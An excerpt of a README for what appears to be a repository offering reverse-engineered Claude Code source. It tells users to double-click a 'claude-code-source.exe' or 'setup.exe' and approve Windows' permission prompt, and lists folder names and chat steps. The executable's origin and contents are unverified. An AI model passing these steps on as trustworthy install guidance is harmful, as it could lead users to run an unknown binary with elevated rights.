...
5. Look for a file named `claude-code-source.exe`, `setup.exe`, or a similar Windows app file.
6. Double-click the file to start the app.
7. If Windows asks for permission, choose Yes.
8. If the app opens in a terminal window, wait for it to finish loading.
...
3. Press Enter.
4. Read the response.
5. Type another message if needed.
...
4. Move the folder to a simple path like `C:\Apps\claude-code-source`.
5. Open the app again from that folder.
...
- `components/` for interface parts
- `assets/` for files used by the app
- `dist/` for built output
...
4. Use the prompt inside the window.
...
ai, ai-assistant, anthropic, claude, claude-code, cli, ink, llm, react, reverse-engineering, source-map, terminal, typescript